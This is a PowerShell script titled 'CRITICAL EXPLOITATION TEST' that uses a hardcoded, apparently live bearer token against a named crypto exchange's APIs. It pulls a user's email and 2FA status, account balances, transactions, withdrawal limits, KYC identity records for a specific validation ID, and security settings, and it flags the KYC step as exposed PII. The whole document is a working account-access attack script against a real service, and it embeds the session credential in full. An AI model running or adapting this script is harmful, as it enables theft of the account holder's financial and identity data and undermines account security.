$token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ0b2tlbl90eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzY0NjEyMzc1LCJpYXQiOjE3NjQ2MTA0NDQsImp0aSI6IjdjOWY0MmFmNDJiZTQwMDRiNjc3NGU5ZDNiMmRmMzU4IiwidXNlcl91c2VyX3V1aWQiOiI2OTFlMjEzNi00OGJiLTRlNTUtOTMxOC1hNTk0YWM5YzNjZWMiLCJwcml2YXRlIjoiZ0FBQUFBQnBMZEdNazdFbnhLc3VtN2VkLXMxZlVvN3Y2Wld1UTVnTzlodHh6anJKMC1VX0RtSW1abVFwVldic0xqYWlRRTRDVE9IZ2E5dnRaSW5RT1paamFGZnZJVmJtRDVqcmFZbHRLZXpESGJqQ1A5bjhvU0RCTnRnaWhpOVBzRkZ6S1ZuZHR5Qndfakl5dVJPZDl2NDV5NUJRUG4wNlMxYVpNSWJBUDlZY20zVEp5SlU2ME42b3JwTW1uT2RzT19yR25EdXhhZEpiNjZVbXhiX0FGS2xBRTM5dnJieVVZcU05Mkl5V2N2UVFCVTAycXl5RWVVZUhaaEE0eGRiMVg0WUxSd2J4Z253dkRlTkh2Nnl2ZUNDWFM4cTV3ZHM0ZUw2a090eXkzNjVKbEtnRVdlUFc4XzBzazN1THJ0NWRDX2xZUjF3LXNOcjMiLCJ1YV9oYXNoIjoiZ0FBQUFBQnBMZEdNUE02VlNMTHlDM2ZMN2Y1QjNmeFkxSHVIamVpRjd3QUpKNms5YzR6WGpHLXR5V09iUjlvLTFicHBBQzB0TzdpRm16RTB2WFV5clNHZ05FTUxFMGU3Y2xmTVk0cEU3MEFvdndWdVVrSTJCRmQ4eTRQamZjVE1jUDA3dVlyaGw1OVVfTUMya3hoV0Q1d2tlZ2VDRlVjV0JmeEVTSlpua0ZhSlA0NWF0c1llaUlBPSIsImJhY2siOiJSSVBJTyIsImZpbmdlcnByaW50IjoiZjNkYmVkNDIxMDFjZjkzMDkzYTQwZjIyZGJiZmYyMzJiZjVlODgzYTM1M2NkOTZiZDdlNzIwZTlhY2U0ZDU1YSIsImhhc18yZmEiOmZhbHNlLCJpc19zdGFmZiI6ZmFsc2V9.cYdqwWCziszy4sOO3zkcTobjcGpk2neQniR3bwI4BDda-Io0pCxhzM8vTWE1bIphNbuC5ZRLKkzK2kwEydXoSbfE65rLZaPN8rH_-VqVmDeuNt4uEY29V92__oArkyEtqWa4B1dtwzOL1tzid7ipPQ_6sKDcq91sGTt_pULymAJWWlUoQxEN7Dp414xG9FqB2CB5ZVNoR23sReqab4LTuNWJzNDhoWX2DJsy_AHO75n_02ikmyI6Twh2IJ5hGGEnEmRc3OG3i7UdCb5agfzsdyucl0U28bSvrKwjku8iD6h4hMRXXGBGGMxpBJamOsdyJH5zd7MEnwx-NmxxgQONyA"

$headers = @{
    "Authorization" = "Bearer $token"
    "Content-Type" = "application/json"
}

Write-Host "=== CRITICAL EXPLOITATION TEST ===" -ForegroundColor Red
Write-Host ""

# 1. Get user info
Write-Host "[1] USER INFO:" -ForegroundColor Yellow
try {
    $user = Invoke-RestMethod -Uri "https://auth.ripio.com/api/users/me/" -Headers $headers -Method GET
    Write-Host "  Email: $($user.email)" -ForegroundColor Green
    Write-Host "  UUID: $($user.user_uuid)" -ForegroundColor Green
    Write-Host "  Country: $($user.country)" -ForegroundColor Green
    Write-Host "  2FA: $($user.is_two_factor_enabled)" -ForegroundColor Green
} catch {
    Write-Host "  Error: $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Red
}

# 2. Get balances
Write-Host ""
Write-Host "[2] ACCOUNT BALANCES:" -ForegroundColor Yellow
try {
    $balance = Invoke-RestMethod -Uri "https://nexus.ripio.com/api/v1/balances/?ref_currency=ARS" -Headers $headers -Method GET
    $balance | ConvertTo-Json -Depth 3
} catch {
    Write-Host "  Error: $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Red
}

# 3. Get transactions
Write-Host ""
Write-Host "[3] TRANSACTIONS:" -ForegroundColor Yellow
try {
    $txs = Invoke-RestMethod -Uri "https://app.ripio.com/api/v3/transactions/?limit=5" -Headers $headers -Method GET
    $txs | ConvertTo-Json -Depth 3
} catch {
    Write-Host "  Error: $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Red
}

# 4. Get withdrawal limits
Write-Host ""
Write-Host "[4] WITHDRAWAL LIMITS:" -ForegroundColor Yellow
try {
    $limits = Invoke-RestMethod -Uri "https://app.ripio.com/api/v3/transactions/limits/" -Headers $headers -Method GET
    $limits | ConvertTo-Json -Depth 3
} catch {
    Write-Host "  Error: $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Red
}

# 5. KYC data
Write-Host ""
Write-Host "[5] KYC VALIDATION DATA:" -ForegroundColor Yellow
try {
    $kyc = Invoke-RestMethod -Uri "https://kyc-api.ripio.com/api/v2/validations/3418360/" -Headers $headers -Method GET
    Write-Host "  KYC Status: SUCCESS - PII EXPOSED!" -ForegroundColor Red
    $kyc | ConvertTo-Json -Depth 3
} catch {
    Write-Host "  Error: $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Red
}

# 6. Security settings
Write-Host ""
Write-Host "[6] SECURITY SETTINGS (CAN DISABLE 2FA?):" -ForegroundColor Yellow
try {
    $sec = Invoke-RestMethod -Uri "https://auth.ripio.com/api/users/security/" -Headers $headers -Method GET
    $sec | ConvertTo-Json -Depth 3
} catch {
    Write-Host "  Error: $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Red
}
